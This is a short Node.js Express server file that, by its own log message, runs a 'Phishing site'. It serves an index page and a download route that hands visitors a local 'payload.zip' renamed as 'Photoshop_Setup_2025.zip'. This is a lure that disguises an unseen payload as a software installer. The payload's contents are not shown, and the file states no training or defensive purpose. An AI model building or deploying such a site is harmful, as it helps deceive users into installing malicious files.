const express = require("express");
const path = require("path");

const app = express();
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.render("index");
});

// Download ZIP payload
app.get("/download", (req, res) => {
  const filePath = path.join(__dirname, "payload.zip");
  res.download(filePath, "Photoshop_Setup_2025.zip");
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`⚠️ Phishing site running at: http://localhost:${PORT}`);
});
